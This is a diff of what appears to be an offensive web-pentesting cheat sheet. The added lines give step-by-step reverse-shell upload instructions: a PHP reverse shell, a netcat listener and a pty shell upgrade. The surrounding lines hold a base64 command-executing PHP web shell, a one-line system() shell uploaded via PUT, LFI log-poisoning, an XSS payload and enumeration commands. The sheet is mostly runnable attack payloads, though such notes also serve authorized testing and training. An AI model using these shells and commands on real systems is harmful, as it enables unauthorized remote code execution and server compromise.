@@ -122,8 +122,18 @@ Inspector - post DOM
 
 # File or PUT Upload Vuln
 
-Create a PHP file called shell.php
+- Example 1
+cp /usr/share/webshells/php/php-reverse-shell.php /home/kali/test.php
+Modify to following line:
+$ip = '127.0.0.1';  // CHANGE THIS
+Upload the file.
+nc -lvnp 1234
+firefox http://<target IP>/uploads/test.php
+View your netcat listener for a shell.
+Upgrade your shell to a fully interactive tty: python3 -c 'import pty;pty.spawn("/bin/bash")'
 
+- Example 2
+Create a PHP file called shell.php
 <?php
 $cmd=$_GET["cmd"];
 $decode=base64_decode($cmd);
@@ -131,9 +141,9 @@ os.system($decode);
 ?>
 
 curl -ikL -T shell.php http://target.com/shell.php
-Once the file has been uploaded, pass Base64 encoded commands to it to get basic code execution
+Once the file has been uploaded, pass Base64 encoded commands to it to get basic code execution.
 
-- Method 2
+- Example 3
 curl -ikL -X PUT -d '<?php system($_GET["c"]);?>' http://target.com/shell.php
 
 wget -O output -o /dev/null www.target.com/test.php?cmd=$(echo id|base64)
@@ -158,7 +168,7 @@ for i in `cat 80.txt` ; do curl -ikL -X HEAD http://$i/ > $i 2>&1 ; echo Scannin
 for i in `cat ssl.txt` ; do curl -ikL -X HEAD https://$i/ > $i 2>&1 ; echo Scanning $i ; done
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# HTTP methods allowed
+# HTTP Methods Allowed
 
 nc target.com 80
 OPTIONS / HTTP/1.0
@@ -209,7 +219,7 @@ Connection: close
 Send as cmd payload via http://target.com/index.php?page=../../../../../var/log/apache2/access.log&cmd=id
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# PHP version
+# PHP Version
 
 nc target.com 80
 GET / HEAD/1.0
@@ -267,7 +277,7 @@ Example: <script>alert(document.cookie);</script>
 Encoded: %3Cscript%3Ealert%28document%2Ecookie%29%3B%3C%2Fscript%3E
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# WebDAV extensions are enabled
+# WebDAV Extensions Enabled
 
 msfconsole
 use auxiliary/scanner/http/webdav_scanner
@@ -332,8 +342,8 @@ Firefox <target IP>
 Use Wappalyzer plugin to see file types.
 If the website uses PHP, add -x php
 
-gobuster dir -w /usr/share/wordlists/dirb/common.txt -x php,http -u <target IP>
-gobuster dir -w /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt -x php,http -u <target IP>
+gobuster dir -u <target IP> -w /usr/share/wordlists/dirb/common.txt -x php
+gobuster dir -u <target IP> -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -x php
 
 - Create a custom wordlist
 cewl --lowercase -e --email_file emails.txt -w dict.txt https://$url
